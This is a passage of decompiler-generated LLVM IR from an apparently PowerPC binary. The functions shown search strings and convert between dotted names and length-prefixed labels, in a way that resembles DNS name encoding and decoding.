  %v2_1000cb2c = and i32 %v2_1000cb24, -2130640640
  %v3_1000cb2c = xor i32 %v2_1000cb2c, -2130640640
  %v2_1000cb30 = xor i32 %v1_1000cb28, %v2_1000cb18
  %v2_1000cb34 = and i32 %v2_1000cb30, -2130640640
  %v3_1000cb34 = xor i32 %v2_1000cb34, -2130640640
  %v1_1000cb40 = add i32 %v0_1000cb64, 1
  %tmp = or i32 %v3_1000cb34, %v3_1000cb2c
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000cb0c, label %dec_label_pc_1000cb4c

dec_label_pc_1000cb4c:                            ; preds = %dec_label_pc_1000cb0c
  %v2_1000cb4c = inttoptr i32 %v0_1000cb64 to i8*
  %v3_1000cb4c = load i8, i8* %v2_1000cb4c, align 1
  %v4_1000cb4c = zext i8 %v3_1000cb4c to i32
  %v1_1000cb50 = add i32 %v0_1000cb64, 2
  %v1_1000cb54 = add i32 %v0_1000cb64, 3
  %v4_1000cb58 = icmp eq i32 %v4_1000cb4c, %v0_1000caf4
  br i1 %v4_1000cb58, label %dec_label_pc_1000cb64, label %dec_label_pc_1000cb6c

dec_label_pc_1000cb64:                            ; preds = %dec_label_pc_1000cb4c
  ret i32 %v0_1000cb64

dec_label_pc_1000cb6c:                            ; preds = %dec_label_pc_1000cb4c
  %v3_1000cb5c = icmp eq i8 %v3_1000cb4c, 0
  br i1 %v3_1000cb5c, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cb70

dec_label_pc_1000cb70:                            ; preds = %dec_label_pc_1000cb6c
  %v2_1000cb70 = inttoptr i32 %v1_1000cb40 to i8*
  %v3_1000cb70 = load i8, i8* %v2_1000cb70, align 1
  %v4_1000cb70 = zext i8 %v3_1000cb70 to i32
  %v4_1000cb74 = icmp eq i32 %v4_1000cb70, %v0_1000caf4
  br i1 %v4_1000cb74, label %dec_label_pc_1000cb80, label %dec_label_pc_1000cb88

dec_label_pc_1000cb80:                            ; preds = %dec_label_pc_1000cb70
  ret i32 %v1_1000cb40

dec_label_pc_1000cb88:                            ; preds = %dec_label_pc_1000cb70
  %v3_1000cb78 = icmp eq i8 %v3_1000cb70, 0
  br i1 %v3_1000cb78, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cb8c

dec_label_pc_1000cb8c:                            ; preds = %dec_label_pc_1000cb88
  %v2_1000cb8c = inttoptr i32 %v1_1000cb50 to i8*
  %v3_1000cb8c = load i8, i8* %v2_1000cb8c, align 1
  %v4_1000cb8c = zext i8 %v3_1000cb8c to i32
  %v4_1000cb90 = icmp eq i32 %v4_1000cb8c, %v0_1000caf4
  br i1 %v4_1000cb90, label %dec_label_pc_1000cb9c, label %dec_label_pc_1000cba4

dec_label_pc_1000cb9c:                            ; preds = %dec_label_pc_1000cb8c
  ret i32 %v1_1000cb50

dec_label_pc_1000cba4:                            ; preds = %dec_label_pc_1000cb8c
  %v3_1000cb94 = icmp eq i8 %v3_1000cb8c, 0
  br i1 %v3_1000cb94, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cba8

dec_label_pc_1000cba8:                            ; preds = %dec_label_pc_1000cba4
  %v2_1000cba8 = inttoptr i32 %v1_1000cb54 to i8*
  %v3_1000cba8 = load i8, i8* %v2_1000cba8, align 1
  %v4_1000cba8 = zext i8 %v3_1000cba8 to i32
  %v4_1000cbac = icmp eq i32 %v4_1000cba8, %v0_1000caf4
  br i1 %v4_1000cbac, label %dec_label_pc_1000cbb8, label %dec_label_pc_1000cbc0

dec_label_pc_1000cbb8:                            ; preds = %dec_label_pc_1000cba8
  ret i32 %v1_1000cb54

dec_label_pc_1000cbc0:                            ; preds = %dec_label_pc_1000cba8
  %v3_1000cbb0 = icmp eq i8 %v3_1000cba8, 0
  br i1 %v3_1000cbb0, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cb0c

dec_label_pc_1000cbc4:                            ; preds = %dec_label_pc_1000cad4, %dec_label_pc_1000cbc0, %dec_label_pc_1000cb88, %dec_label_pc_1000cb6c, %dec_label_pc_1000cba4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000cb10, { 1, 0 }
  uselistorder i32 %v2_1000cb0c, { 0, 2, 1 }
  uselistorder i32 %v0_1000cb64, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000cafc, { 1, 0 }
  uselistorder i32 %v0_1000caf4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000cae8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000caec2, { 2, 1, 0 }
  uselistorder i32 %v1_1000cacc, { 1, 2, 0 }
  uselistorder i32 3, { 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 2, 53, 3, 0, 10, 18, 27, 62, 29, 20, 19, 12, 21, 45, 11, 46, 4, 47, 48, 54, 55, 22, 56, 57, 16, 15, 5, 14, 28, 51, 52, 17, 35, 6, 7, 49, 8, 9, 58, 59, 67, 68, 69, 63, 64, 65, 66, 13, 61, 60, 50, 23, 30, 31, 24, 32, 33, 25, 34, 26 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8 }
  uselistorder i32 65536, { 0, 1, 21, 2, 3, 4, 5, 7, 6, 8, 9, 22, 10, 11, 12, 14, 13, 15, 16, 19, 17, 20, 18 }
  uselistorder i32 4, { 166, 5, 6, 7, 91, 108, 8, 9, 169, 167, 168, 117, 170, 171, 172, 102, 10, 173, 174, 175, 176, 177, 178, 179, 11, 180, 12, 13, 14, 109, 181, 182, 118, 183, 184, 185, 15, 16, 103, 140, 17, 18, 230, 231, 232, 233, 234, 235, 203, 119, 19, 20, 268, 269, 120, 21, 22, 96, 23, 24, 25, 26, 27, 28, 186, 187, 121, 29, 30, 2, 31, 0, 236, 3, 32, 1, 188, 122, 33, 204, 205, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 270, 249, 97, 284, 291, 34, 35, 36, 37, 38, 271, 272, 39, 273, 40, 274, 41, 42, 134, 43, 44, 135, 45, 148, 149, 150, 212, 213, 214, 46, 136, 47, 48, 49, 137, 50, 138, 139, 217, 219, 218, 215, 216, 220, 221, 222, 223, 224, 225, 226, 227, 228, 116, 189, 123, 190, 191, 98, 51, 52, 192, 53, 193, 194, 195, 196, 197, 198, 104, 54, 199, 275, 276, 250, 55, 56, 57, 105, 58, 114, 59, 106, 107, 60, 113, 251, 61, 62, 285, 286, 287, 124, 288, 289, 290, 63, 277, 278, 279, 94, 95, 280, 281, 125, 282, 283, 64, 200, 65, 66, 67, 68, 69, 70, 71, 252, 72, 253, 254, 110, 255, 256, 257, 258, 259, 73, 74, 260, 261, 111, 262, 263, 112, 264, 265, 267, 75, 76, 92, 93, 266, 206, 77, 207, 126, 208, 142, 143, 144, 115, 4, 145, 146, 147, 209, 210, 127, 78, 79, 141, 80, 81, 82, 83, 84, 99, 85, 86, 151, 152, 128, 153, 154, 155, 129, 156, 87, 157, 158, 159, 130, 160, 161, 162, 163, 164, 165, 201, 131, 202, 100, 88, 211, 101, 89, 229, 90, 133, 132 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 45, 50, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 44, 18, 19, 20, 21, 22, 23, 24, 25, 54, 26, 55, 56, 57, 27, 28, 29, 30, 31, 51, 46, 32, 33, 52, 34, 35, 53, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49 }
  uselistorder label %dec_label_pc_1000cbc4, { 1, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000cb0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cad4, { 1, 0 }
}

define i32 @function_1000cbcc(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000cbcc:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cbd0 = load i32, i32* @lr, align 4
  store i32 %v0_1000cbd0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000cbdc = load i32, i32* @r4, align 4
  store i32 %v0_1000cbdc, i32* @r29, align 4
  %v0_1000cbe0 = load i32, i32* @r5, align 4
  store i32 %v0_1000cbe0, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000cc4c13 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000cc4c13, label %dec_label_pc_1000cc68, label %dec_label_pc_1000cc5c

dec_label_pc_1000cbf0:                            ; preds = %dec_label_pc_1000cc5c
  store i32 268487668, i32* @lr, align 4
  %v3_1000cbf0 = call i32 @function_1000cacc(i32 %v0_1000cc5c14, i32 46)
  store i32 %v3_1000cbf0, i32* @r30, align 4
  %v3_1000cbf4 = icmp eq i32 %v3_1000cbf0, 0
  %v0_1000cbf8 = load i32, i32* @r31, align 4
  store i32 %v0_1000cbf8, i32* @r3, align 4
  %v2_1000cbfc = sub i32 %v3_1000cbf0, %v0_1000cbf8
  store i32 %v2_1000cbfc, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cbf4, label %dec_label_pc_1000cc04, label %dec_label_pc_1000cc0c

dec_label_pc_1000cc04:                            ; preds = %dec_label_pc_1000cbf0
  %v0_1000cc04 = call i32 @function_10006ed8()
  store i32 %v0_1000cc04, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000cc04, 16777216
  %v1_1000cc08 = sdiv i32 %sext, 16777216
  store i32 %v1_1000cc08, i32* %r0.global-to-local, align 4
  %v0_1000cc1c.pre = load i32, i32* @r31, align 4
  %v0_1000cc2c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cc0c

dec_label_pc_1000cc0c:                            ; preds = %dec_label_pc_1000cbf0, %dec_label_pc_1000cc04
  %v0_1000cc2c = phi i32 [ %v3_1000cbf0, %dec_label_pc_1000cbf0 ], [ %v0_1000cc2c.pre, %dec_label_pc_1000cc04 ]
  %v0_1000cc1c = phi i32 [ %v0_1000cbf8, %dec_label_pc_1000cbf0 ], [ %v0_1000cc1c.pre, %dec_label_pc_1000cc04 ]
  %v0_1000cc38 = phi i32 [ %v2_1000cbfc, %dec_label_pc_1000cbf0 ], [ %v1_1000cc08, %dec_label_pc_1000cc04 ]
  %v0_1000cc10 = load i32, i32* @r28, align 4
  %v1_1000cc10 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cc10 = sub i32 %v1_1000cc10, %v0_1000cc10
  %v1_1000cc14 = add i32 %v0_1000cc10, 1
  store i32 %v1_1000cc14, i32* %r11.global-to-local, align 4
  %v1_1000cc18 = add i32 %v2_1000cc10, -1
  store i32 %v0_1000cc1c, i32* @r4, align 4
  %v0_1000cc20 = load i32, i32* @r29, align 4
  %v2_1000cc20 = add i32 %v0_1000cc20, %v1_1000cc14
  store i32 %v2_1000cc20, i32* @r3, align 4
  store i32 %v0_1000cc38, i32* @r5, align 4
  %v2_1000cc28 = icmp ult i32 %v0_1000cc38, %v1_1000cc18
  %v1_1000cc2c = add i32 %v0_1000cc2c, 1
  store i32 %v1_1000cc2c, i32* @r31, align 4
  %v3_1000cc0c.not = icmp ne i32 %v0_1000cc38, 0
  %or.cond = and i1 %v2_1000cc28, %v3_1000cc0c.not
  br i1 %or.cond, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc80

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc0c
  %v3_1000cc38 = trunc i32 %v0_1000cc38 to i8
  %v4_1000cc38 = add i32 %v0_1000cc20, %v0_1000cc10
  %v5_1000cc38 = inttoptr i32 %v4_1000cc38 to i8*
  store i8 %v3_1000cc38, i8* %v5_1000cc38, align 1
  %v0_1000cc3c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cc3c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cc3c = add i32 %v1_1000cc3c, %v0_1000cc3c
  store i32 %v2_1000cc3c, i32* @r28, align 4
  store i32 268487748, i32* @lr, align 4
  %v0_1000cc40 = call i32 @function_10006d8c()
  store i32 %v0_1000cc40, i32* %r3.global-to-local, align 4
  %v0_1000cc44 = load i32, i32* @r30, align 4
  %v3_1000cc44 = icmp eq i32 %v0_1000cc44, 0
  br i1 %v3_1000cc44, label %dec_label_pc_1000cc68, label %dec_label_pc_1000cc38.dec_label_pc_1000cc4c_crit_edge

dec_label_pc_1000cc38.dec_label_pc_1000cc4c_crit_edge: ; preds = %dec_label_pc_1000cc38
  %v0_1000cc4c.pre = load i32, i32* @r31, align 4
  %v3_1000cc4c = icmp eq i32 %v0_1000cc4c.pre, 0
  store i32 %v0_1000cc4c.pre, i32* @r3, align 4
  br i1 %v3_1000cc4c, label %dec_label_pc_1000cc68, label %dec_label_pc_1000cc5c

dec_label_pc_1000cc5c:                            ; preds = %dec_label_pc_1000cbcc, %dec_label_pc_1000cc38.dec_label_pc_1000cc4c_crit_edge
  %v0_1000cc5c14 = phi i32 [ %v0_1000cc4c.pre, %dec_label_pc_1000cc38.dec_label_pc_1000cc4c_crit_edge ], [ %tmp, %dec_label_pc_1000cbcc ]
  %v1_1000cc5c = inttoptr i32 %v0_1000cc5c14 to i8*
  %v2_1000cc5c = load i8, i8* %v1_1000cc5c, align 1
  %v3_1000cc5c = zext i8 %v2_1000cc5c to i32
  store i32 %v3_1000cc5c, i32* %r0.global-to-local, align 4
  %v3_1000cc60 = icmp eq i8 %v2_1000cc5c, 0
  br i1 %v3_1000cc60, label %dec_label_pc_1000cc68, label %dec_label_pc_1000cbf0

dec_label_pc_1000cc68:                            ; preds = %dec_label_pc_1000cc38.dec_label_pc_1000cc4c_crit_edge, %dec_label_pc_1000cc38, %dec_label_pc_1000cc5c, %dec_label_pc_1000cbcc
  %v0_1000cc68 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000cc68, 1
  br i1 %tmp10, label %dec_label_pc_1000cc80, label %dec_label_pc_1000cc70

dec_label_pc_1000cc70:                            ; preds = %dec_label_pc_1000cc68
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cc74 = load i32, i32* @r28, align 4
  %v1_1000cc74 = add i32 %v0_1000cc74, 1
  store i32 %v1_1000cc74, i32* %r3.global-to-local, align 4
  %v1_1000cc78 = load i32, i32* @r29, align 4
  %v4_1000cc78 = add i32 %v1_1000cc78, %v0_1000cc74
  %v5_1000cc78 = inttoptr i32 %v4_1000cc78 to i8*
  store i8 0, i8* %v5_1000cc78, align 1
  %v0_1000cc94.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc84

dec_label_pc_1000cc80:                            ; preds = %dec_label_pc_1000cc0c, %dec_label_pc_1000cc68
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc84

dec_label_pc_1000cc84:                            ; preds = %dec_label_pc_1000cc70, %dec_label_pc_1000cc80
  %v0_1000cc94 = phi i32 [ %v0_1000cc94.pre, %dec_label_pc_1000cc70 ], [ -1, %dec_label_pc_1000cc80 ]
  store i32 %v0_1000cbd0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cc94

; uselistorder directives
  uselistorder i32 %v0_1000cc5c14, { 1, 0 }
  uselistorder i32 %v0_1000cc4c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000cc38, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000cc08, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @function_10006ed8, { 12, 40, 39, 20, 21, 13, 11, 9, 19, 18, 1, 38, 2, 37, 36, 35, 3, 34, 7, 6, 33, 32, 31, 5, 4, 30, 29, 28, 27, 8, 26, 25, 24, 23, 22, 17, 0, 16, 14, 15, 10 }
  uselistorder i32 (i32, i32)* @function_1000cacc, { 0, 2, 1 }
  uselistorder i32 46, { 0, 3, 1, 4, 5, 2 }
  uselistorder label %dec_label_pc_1000cc84, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc80, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc68, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000cc5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc0c, { 1, 0 }
}

define i32 @function_1000cc98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cc98:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000cc9c = call i32 @__asm_mfcr()
  store i32 %v0_1000cc9c, i32* @r26, align 4
  %v3_1000cca8 = icmp eq i32 %v0_1000cc9c, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000ccb8 = load i32, i32* @r6, align 4
  store i32 %v0_1000ccb8, i32* @r24, align 4
  br i1 %v3_1000cca8, label %dec_label_pc_1000cd70, label %dec_label_pc_1000ccc0

dec_label_pc_1000ccc0:                            ; preds = %dec_label_pc_1000cc98
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000cd4c14 = load i32, i32* @r4, align 4
  %v2_1000cd4c15 = add i32 %v1_1000cd4c14, %v0_1000cc9c
  %v3_1000cd4c16 = inttoptr i32 %v2_1000cd4c15 to i8*
  %v4_1000cd4c17 = load i8, i8* %v3_1000cd4c16, align 1
  %v5_1000cd4c18 = zext i8 %v4_1000cd4c17 to i32
  store i32 %v5_1000cd4c18, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000cd5420 = icmp eq i8 %v4_1000cd4c17, 0
  br i1 %v3_1000cd5420, label %dec_label_pc_1000cd60, label %dec_label_pc_1000ccd0

dec_label_pc_1000ccd0:                            ; preds = %dec_label_pc_1000ccc0, %dec_label_pc_1000cd48
  %v3_1000cd5022 = phi i1 [ %v3_1000cd50, %dec_label_pc_1000cd48 ], [ false, %dec_label_pc_1000ccc0 ]
  %v5_1000cd4c21 = phi i32 [ %v5_1000cd4c, %dec_label_pc_1000cd48 ], [ %v5_1000cd4c18, %dec_label_pc_1000ccc0 ]
  br i1 %v3_1000cd5022, label %dec_label_pc_1000ccd8, label %dec_label_pc_1000ccd4

dec_label_pc_1000ccd4:                            ; preds = %dec_label_pc_1000ccd0
  %v0_1000ccd4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ccd4 = add i32 %v0_1000ccd4, 1
  store i32 %v1_1000ccd4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ccd8

dec_label_pc_1000ccd8:                            ; preds = %dec_label_pc_1000ccd0, %dec_label_pc_1000ccd4
  %v1_1000ccd8 = call i32 @__asm_rlwinm(i32 %v5_1000cd4c21, i32 0, i32 24, i32 25)
  %v0_1000ccdc = load i32, i32* @r4, align 4
  %v1_1000ccdc = add i32 %v0_1000ccdc, 1
  store i32 %v1_1000ccdc, i32* @r30, align 4
  %v3_1000cce0 = icmp eq i32 %v1_1000ccd8, 192
  br i1 %v3_1000cce0, label %dec_label_pc_1000cce8, label %dec_label_pc_1000cd08

dec_label_pc_1000cce8:                            ; preds = %dec_label_pc_1000ccd8
  %v0_1000cce8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000cce8, label %dec_label_pc_1000ccf0, label %dec_label_pc_1000ccec

dec_label_pc_1000ccec:                            ; preds = %dec_label_pc_1000cce8
  %v0_1000ccec = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ccec = add i32 %v0_1000ccec, 1
  store i32 %v1_1000ccec, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ccf0

dec_label_pc_1000ccf0:                            ; preds = %dec_label_pc_1000cce8, %dec_label_pc_1000ccec
  %v0_1000ccf0 = load i32, i32* @r26, align 4
  %v2_1000ccf0 = add i32 %v0_1000ccf0, %v1_1000ccdc
  %v3_1000ccf0 = inttoptr i32 %v2_1000ccf0 to i8*
  %v4_1000ccf0 = load i8, i8* %v3_1000ccf0, align 1
  %v5_1000ccf0 = zext i8 %v4_1000ccf0 to i32
  %v1_1000ccf4 = call i32 @__asm_rlwinm(i32 %v5_1000cd4c21, i32 8, i32 18, i32 23)
  %v0_1000ccf8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ccf8, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000cd00 = or i32 %v5_1000ccf0, %v1_1000ccf4
  store i32 %v2_1000cd00, i32* @r4, align 4
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd08:                            ; preds = %dec_label_pc_1000ccd8
  %v0_1000cd08 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cd08 = add i32 %v0_1000cd08, %v5_1000cd4c21
  store i32 %v2_1000cd08, i32* @r29, align 4
  %v1_1000cd0c = add i32 %v2_1000cd08, 1
  store i32 %v1_1000cd0c, i32* @r28, align 4
  %v1_1000cd10 = load i32, i32* @r24, align 4
  %v2_1000cd10 = icmp ult i32 %v1_1000cd0c, %v1_1000cd10
  br i1 %v2_1000cd10, label %dec_label_pc_1000cd18, label %dec_label_pc_1000cd70

dec_label_pc_1000cd18:                            ; preds = %dec_label_pc_1000cd08
  %v0_1000cd18 = load i32, i32* @r26, align 4
  %v2_1000cd18 = add i32 %v0_1000cd18, %v1_1000ccdc
  store i32 %v2_1000cd18, i32* @r4, align 4
  %v0_1000cd1c = load i32, i32* @r25, align 4
  %v2_1000cd1c = add i32 %v0_1000cd1c, %v0_1000cd08
  store i32 %v2_1000cd1c, i32* @r3, align 4
  store i32 %v5_1000cd4c21, i32* @r5, align 4
  store i32 268487976, i32* @lr, align 4
  %v0_1000cd24 = call i32 @function_10006d8c()
  %v0_1000cd28 = load i32, i32* @r30, align 4
  %v2_1000cd28 = add i32 %v0_1000cd28, %v5_1000cd4c21
  store i32 %v2_1000cd28, i32* @r4, align 4
  %v0_1000cd2c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000cd2c, label %dec_label_pc_1000cd34, label %dec_label_pc_1000cd30

dec_label_pc_1000cd30:                            ; preds = %dec_label_pc_1000cd18
  %v0_1000cd30 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cd30 = add i32 %v0_1000cd30, %v5_1000cd4c21
  store i32 %v2_1000cd30, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000cd34

dec_label_pc_1000cd34:                            ; preds = %dec_label_pc_1000cd18, %dec_label_pc_1000cd30
  %v0_1000cd34 = load i32, i32* @r26, align 4
  %v2_1000cd34 = add i32 %v0_1000cd34, %v2_1000cd28
  %v3_1000cd34 = inttoptr i32 %v2_1000cd34 to i8*
  %v4_1000cd34 = load i8, i8* %v3_1000cd34, align 1
  %v3_1000cd38 = icmp eq i8 %v4_1000cd34, 0
  br i1 %v3_1000cd38, label %dec_label_pc_1000cd44, label %dec_label_pc_1000cd40

dec_label_pc_1000cd40:                            ; preds = %dec_label_pc_1000cd34
  br label %dec_label_pc_1000cd44

dec_label_pc_1000cd44:                            ; preds = %dec_label_pc_1000cd34, %dec_label_pc_1000cd40
  %v0_1000cd44.off0 = phi i8 [ 0, %dec_label_pc_1000cd34 ], [ 46, %dec_label_pc_1000cd40 ]
  %v1_1000cd44 = load i32, i32* @r25, align 4
  %v2_1000cd44 = load i32, i32* @r29, align 4
  %v4_1000cd44 = add i32 %v2_1000cd44, %v1_1000cd44
  %v5_1000cd44 = inttoptr i32 %v4_1000cd44 to i8*
  store i8 %v0_1000cd44.off0, i8* %v5_1000cd44, align 1
  %v0_1000cd48.pre = load i32, i32* @r28, align 4
  %v0_1000cd50.pre.pre = load i32, i32* @r23, align 4
  %v1_1000cd4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000ccf0, %dec_label_pc_1000cd44
  %v1_1000cd4c = phi i32 [ %v2_1000cd00, %dec_label_pc_1000ccf0 ], [ %v1_1000cd4c.pre, %dec_label_pc_1000cd44 ]
  %v0_1000cd50.pre = phi i32 [ 0, %dec_label_pc_1000ccf0 ], [ %v0_1000cd50.pre.pre, %dec_label_pc_1000cd44 ]
  %v0_1000cd48 = phi i32 [ %v0_1000ccf8, %dec_label_pc_1000ccf0 ], [ %v0_1000cd48.pre, %dec_label_pc_1000cd44 ]
  %v0_1000cd4c.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000cd48, i32* %r11.global-to-local, align 4
  %v2_1000cd4c = add i32 %v1_1000cd4c, %v0_1000cd4c.pre
  %v3_1000cd4c = inttoptr i32 %v2_1000cd4c to i8*
  %v4_1000cd4c = load i8, i8* %v3_1000cd4c, align 1
  %v5_1000cd4c = zext i8 %v4_1000cd4c to i32
  store i32 %v5_1000cd4c, i32* @r31, align 4
  %v3_1000cd50 = icmp eq i32 %v0_1000cd50.pre, 0
  store i1 %v3_1000cd50, i1* %cr4_eq.global-to-local, align 1
  %v3_1000cd54 = icmp eq i8 %v4_1000cd4c, 0
  br i1 %v3_1000cd54, label %dec_label_pc_1000cd5c, label %dec_label_pc_1000ccd0

dec_label_pc_1000cd5c:                            ; preds = %dec_label_pc_1000cd48
  %v0_1000cd64.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000cd50, label %dec_label_pc_1000cd70, label %dec_label_pc_1000cd60

dec_label_pc_1000cd60:                            ; preds = %dec_label_pc_1000ccc0, %dec_label_pc_1000cd5c
  %v0_1000cd64.pre26 = phi i32 [ %v0_1000cd64.pre.pre, %dec_label_pc_1000cd5c ], [ 0, %dec_label_pc_1000ccc0 ]
  %v1_1000cd60 = add i32 %v0_1000cd64.pre26, 1
  store i32 %v1_1000cd60, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000cd70

dec_label_pc_1000cd70:                            ; preds = %dec_label_pc_1000cd08, %dec_label_pc_1000cd5c, %dec_label_pc_1000cd60, %dec_label_pc_1000cc98
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000cc98 ], [ %v1_1000cd60, %dec_label_pc_1000cd60 ], [ %v0_1000cd64.pre.pre, %dec_label_pc_1000cd5c ], [ -1, %dec_label_pc_1000cd08 ]
  %v1_1000cd80 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000cc9c)
  %v9_1000cd80 = extractvalue %0 %v1_1000cd80, 7
  store i4 %v9_1000cd80, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000cd64.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000cd50, { 0, 2, 1 }
  uselistorder i32 %v5_1000cd4c, { 1, 0 }
  uselistorder i32 %v5_1000cd4c21, { 5, 4, 2, 3, 1, 0 }
  uselistorder i32 %v0_1000cc9c, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 0, 1, 2, 4, 3 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 4, 0, 1 }
  uselistorder i32 ()* @function_10006d8c, { 7, 6, 19, 18, 4, 3, 16, 15, 2, 23, 11, 10, 0, 14, 1, 17, 9, 8, 5, 22, 21, 20, 13, 12 }
  uselistorder i32* @r5, { 19, 20, 21, 3, 22, 23, 37, 63, 64, 25, 26, 7, 5, 27, 1, 28, 38, 39, 40, 41, 42, 43, 65, 11, 44, 45, 46, 47, 48, 49, 6, 66, 67, 78, 29, 30, 70, 71, 72, 8, 24, 50, 51, 52, 79, 80, 81, 82, 73, 74, 2, 75, 76, 77, 31, 53, 55, 54, 56, 0, 57, 58, 59, 68, 69, 33, 34, 60, 61, 12, 62, 35, 4, 9, 10, 13, 14, 15, 16, 17, 18, 32, 36 }
  uselistorder i32* @r29, { 23, 24, 25, 26, 27, 123, 124, 1, 28, 12, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 16, 17, 18, 19, 20, 2, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 92, 125, 126, 48, 49, 50, 53, 54, 127, 128, 94, 95, 96, 93, 97, 14, 98, 99, 3, 100, 101, 102, 103, 104, 105, 129, 130, 131, 132, 133, 79, 80, 81, 82, 83, 84, 4, 85, 86, 87, 88, 89, 90, 91, 55, 56, 57, 5, 134, 135, 136, 51, 52, 106, 107, 6, 108, 109, 110, 111, 61, 62, 13, 63, 64, 65, 66, 67, 68, 15, 7, 0, 69, 112, 113, 114, 115, 116, 117, 118, 121, 8, 11, 9, 122, 21, 119, 120, 137, 138, 139, 140, 70, 71, 72, 73, 74, 10, 75, 22, 76, 77, 78 }
